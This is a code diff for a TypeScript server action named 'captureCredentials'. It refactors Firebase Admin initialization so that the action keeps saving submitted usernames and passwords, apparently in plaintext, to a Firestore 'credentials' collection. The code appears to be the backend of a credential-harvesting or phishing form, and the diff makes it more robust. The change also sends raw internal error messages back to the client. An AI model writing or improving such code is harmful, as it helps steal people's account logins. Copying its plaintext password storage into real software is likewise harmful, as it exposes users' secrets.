@@ -2,25 +2,28 @@
 
 import * as admin from 'firebase-admin';
 
-// Initialize Firebase Admin SDK
-// This needs the FIREBASE_SERVICE_ACCOUNT environment variable to be set
-if (!admin.apps.length) {
-  try {
-    const serviceAccountString = process.env.FIREBASE_SERVICE_ACCOUNT;
-    if (!serviceAccountString) {
-      throw new Error('FIREBASE_SERVICE_ACCOUNT environment variable is not set.');
+// This function ensures Firebase Admin is initialized, but only once.
+function initializeFirebaseAdmin() {
+  if (!admin.apps.length) {
+    try {
+      const serviceAccountString = process.env.FIREBASE_SERVICE_ACCOUNT;
+      if (!serviceAccountString) {
+        throw new Error('FIREBASE_SERVICE_ACCOUNT environment variable is not set.');
+      }
+      const serviceAccount = JSON.parse(serviceAccountString);
+
+      admin.initializeApp({
+        credential: admin.credential.cert(serviceAccount),
+      });
+      console.log('Firebase Admin SDK initialized successfully.');
+    } catch (error: any) {
+      console.error('Failed to initialize Firebase Admin SDK:', error.message);
+      // We throw the error to prevent the app from continuing without a database connection.
+      throw new Error('Server configuration error: Could not initialize Firebase Admin.');
     }
-    const serviceAccount = JSON.parse(serviceAccountString);
-
-    admin.initializeApp({
-      credential: admin.credential.cert(serviceAccount),
-    });
-  } catch (error: any) {
-    console.error('Failed to initialize Firebase Admin SDK:', error.message);
   }
+  return admin.firestore();
 }
-
-const firestore = admin.firestore();
 
 // Server action to capture credentials
 export async function captureCredentials(prevState: any, formData: FormData) {
@@ -34,17 +37,8 @@ export async function captureCredentials(prevState: any, formData: FormData) {
     return { success: false, message: 'Username and password are required.' };
   }
 
-  // Ensure the Admin SDK was initialized before proceeding
-  if (!admin.apps.length) {
-    const errorMessage = 'Server configuration error. Unable to connect to the database.';
-    console.error(errorMessage);
-    return {
-      success: false,
-      message: errorMessage,
-    };
-  }
-
   try {
+    const firestore = initializeFirebaseAdmin();
     const credentialsCollection = firestore.collection('credentials');
 
     await credentialsCollection.add({
@@ -58,11 +52,11 @@ export async function captureCredentials(prevState: any, formData: FormData) {
     return { success: true, message: 'Submission successful.' };
 
   } catch (error: any) {
-    console.error('Error saving credentials to Firestore with Admin SDK:', error);
+    console.error('Error in captureCredentials:', error.message);
     // Return a specific error message for the client
     return {
       success: false,
-      message: 'Failed to save credentials. Please check server logs and Firestore rules.',
+      message: error.message || 'Failed to save credentials. Please check server logs.',
     };
   }
 }
